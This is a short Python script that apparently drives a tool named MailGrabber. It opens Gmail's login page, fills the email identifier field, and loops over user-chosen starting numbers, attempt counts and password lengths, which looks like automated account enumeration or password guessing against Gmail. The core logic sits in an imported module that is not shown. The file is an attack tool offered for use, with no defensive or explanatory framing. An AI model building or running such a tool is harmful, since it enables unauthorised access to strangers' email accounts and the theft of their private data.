from src.MailGrabber import MailGrabber
import time
from src.const import GMAIL_URL, PASSWORD_URL

with MailGrabber() as mail:
    mail.show_intro()
    mail.instructions()
    mail.go_to_gmail(GMAIL_URL)
    mail.get_current_url()
    mail.start_grabbing("//input[@id='identifierId']", input("\033[32m" + "Enter a starting number => " + "\033[0m"),
                        int(input("\033[32m" + "How many time do you want to keep trying? => " + "\033[0m")),
                        int(input("\033[32m" + "Set a length of password => " + "\033[0m")))
